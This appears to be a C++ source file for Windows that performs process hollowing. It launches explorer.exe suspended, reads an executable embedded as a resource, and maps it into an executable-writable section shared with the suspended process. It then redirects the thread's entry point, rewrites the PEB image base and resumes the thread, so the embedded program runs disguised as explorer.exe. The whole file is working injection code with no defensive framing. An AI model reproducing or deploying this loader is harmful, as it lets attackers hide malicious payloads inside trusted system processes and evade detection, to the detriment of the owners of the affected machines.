#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLen = NULL;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
	FARPROC fpZwCreateSection = GetProcAddress(handleToRemoteNtDll, "ZwCreateSection");
	FARPROC fpZwMapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwMapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	_ZwCreateSection ZwCreateSection = (_ZwCreateSection)fpZwCreateSection;
	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection)fpZwMapViewOfSection;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed (%d).\n", GetLastError());
	}



	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		returnLen
	);

	// GET PEB Info
	PPEB peb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);

	/* Resource Test */
	HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL rescData = LoadResource(NULL, resc);
	LPVOID lpmyExe = LockResource(rescData);


	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpmyExe;

	if (dosHeaderYo->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);


	HANDLE secHandle = NULL;

	LARGE_INTEGER pLarge;
	pLarge.QuadPart = pNTHeaderYo->OptionalHeader.SizeOfImage;

	NTSTATUS s = ZwCreateSection(
		&secHandle,
		SECTION_ALL_ACCESS,
		NULL,
		&pLarge,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	);
	printf("Process id: %i\n", GetCurrentProcessId());
	printf("Created Process id: %i\n", pi.dwProcessId);

	SIZE_T commitSize = pNTHeaderYo->OptionalHeader.SizeOfImage;
	SIZE_T viewSize = 0;
	SIZE_T viewSize2 = 0;
	PVOID sectionBaseAddress = NULL;
	PVOID sectionBaseAddress2 = NULL;

	s = ZwMapViewOfSection(
		secHandle,
		GetCurrentProcess(),
		&sectionBaseAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewUnmap,
		NULL,
		PAGE_EXECUTE_READWRITE
	);
	
	s = ZwMapViewOfSection(
		secHandle,
		pi.hProcess,
		&sectionBaseAddress2,
		NULL,
		NULL,
		NULL,
		&viewSize2,
		ViewUnmap,
		NULL,
		PAGE_EXECUTE_READWRITE
	);

	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];

	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);

	
	if (!WriteProcessMemory(GetCurrentProcess(), sectionBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}
	

	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);

	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
	{
		BYTE* section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
		memcpy(section, (PVOID)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);

		printf("Copying data from: %s\n", sectionHeader->Name);

		if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)sectionBaseAddress + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed: %i", GetLastError());
			return -1;
		}
		sectionHeader++;
	}

	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);

	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);
	lpContext->Eax = (DWORD)sectionBaseAddress2 + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;


	printf("EAX: %x\n", lpContext->Eax);

	SetThreadContext(
		pi.hThread,
		lpContext
	);

	
	DWORD temp = (DWORD)sectionBaseAddress2;
	DWORD* pTemp = &temp;
	

	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
	WriteProcessMemory(
		pi.hProcess,
		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
		pTemp,
		4,
		NULL
	);
	
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);

	printf("Created Process Image Base Address %x\n", sectionBaseAddress);


	printf("Created Process id: %i\n", pi.dwProcessId);
	ResumeThread(
		pi.hThread
	);
	

	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
	printf("Source Base Address %x\n", pNTHeaderYo->OptionalHeader.ImageBase);

	return 0;
}